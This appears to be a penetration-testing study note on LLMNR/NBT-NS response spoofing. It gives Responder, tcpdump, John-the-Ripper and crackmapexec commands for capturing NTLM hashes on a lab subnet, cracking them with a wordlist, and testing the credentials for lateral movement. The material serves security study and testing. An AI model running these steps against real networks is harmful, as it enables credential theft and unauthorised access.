# 🛰️ LLMNR & NBT-NS Response Spoofing

> [!ABSTRACT] Overview
>
> This note provides a detailed walkthrough of how to perform LLMNR and NBT-NS response spoofing for network reconnaissance and attack vector identification.

---

## 🔍 Initial Setup & Environment Details

> [!INFO] Machine IP Configuration
>
> - Target IP: `192.168.56.10`
> - Attacker Machine IP: `192.168.56.1`

---

### LLMNR/NBT-NS Overview

LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS over TCP/IP Name Service) are protocols used for name resolution on local networks when DNS is not available or fails to resolve a name.

> [!NOTE] Protocol Differences
>
> - **LLMNR**: Resolves names within the same subnet using multicast.
> - **NBT-NS**: Uses broadcasts to resolve NetBIOS names and relies more on legacy Windows networking protocols.

---

## 🛠️ Tools & Setup

### Required Tools

- `Responder`
- `john-the-ripper`

> [!NOTE] Tool Installation
>
> Ensure you have the latest version of Responder installed:
```bash
git clone https://github.com/SpiderLabs/responder.git
cd responder
pip install -r requirements.txt
python setup.py install
```

---

### Network Setup

1. Configure your attacker machine to be on the same subnet as the target.
2. Enable LLMNR/NBT-NS in Windows (usually enabled by default).

> [!WARNING] Ethical Considerations
>
> Ensure you have explicit permission to test this against all targets within the network.

---

## 🚀 Initial Attack

### Step 1: Launch Responder

Start `Responder` with the following options:

```bash
sudo responder -I eth0 -wv
```

- `-I eth0`: Specify the interface to listen on.
- `-w`: Enable Wpad and NTLM relay attacks.
- `-v`: Increase verbosity.

> [!SUCCESS] Responder Started Successfully

---

### Step 2: Capture LLMNR/NBT-NS Traffic

Monitor for LLMNR/NBT-NS traffic:

```bash
sudo tcpdump -i eth0 port 137 or port 138 or port 5355 -n -vvv
```

> [!CHECK] Verification
>
> Confirm that Responder is capturing and responding to requests.

---

## 🎲 Attack Execution

### LLMNR/NBT-NS Response Spoofing

Capture NTLM hashes using `Responder`:

```bash
sudo responder -I eth0 -wv
```

When a client makes an LLMNR or NBT-NS request, Responder will capture the NTLM hash.

> [!SUCCESS] Hash Captured Successfully

---

### Password Cracking with John-the-Ripper

Crack captured hashes using `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt /root/responder/logs/hashdump.txt
```

> [!NOTE] Wordlists Location
>
> Common wordlist locations include `/usr/share/wordlists/rockyou.txt`.

---

## 📝 Post-Attack Analysis

### Hash Review & Enumeration

Review the captured hashes:

```text
ntlm:::<HASH>:<USER>@<DOMAIN>
```

Use `crackmapexec` to test cracked passwords against the domain or individual machines:

```bash
crackmapexec smb <IP> -u <username> -p '<password>'
```

> [!CHECK] Verification Steps
>
> Verify that credentials work for administrative access.

---

## 🧪 Common Findings

### Typical Scenarios

| Scenario | Impact |
|---|---|
| Unencrypted Authentication | Capture NTLM Hashes |
| Legacy Network Protocols | LLMNR/NBT-NS Enabled |

---

# 🔍 Further Research & Exploration
> [!QUESTION] Follow-Up Actions
>
> - What happens if SMB signing is enabled?
> - Can you use other tools like `impacket` for similar attacks?

---

## 🧠 Mental Model

```text
LLMNR/NBT-NS Active
 ├─ Monitor Requests → Capture Hashes
 │   ├─ Cracked Hashes? → Credential Validation
 ├─ Use Responder Options → Exploit Misconfigurations
 └─ Test Credentials → Lateral Movement
```

> [!SUCCESS] Key Insight
>
> **LLMNR/NBT-NS attacks are effective when target systems are configured without proper security measures, such as SMB signing or strong authentication protocols.**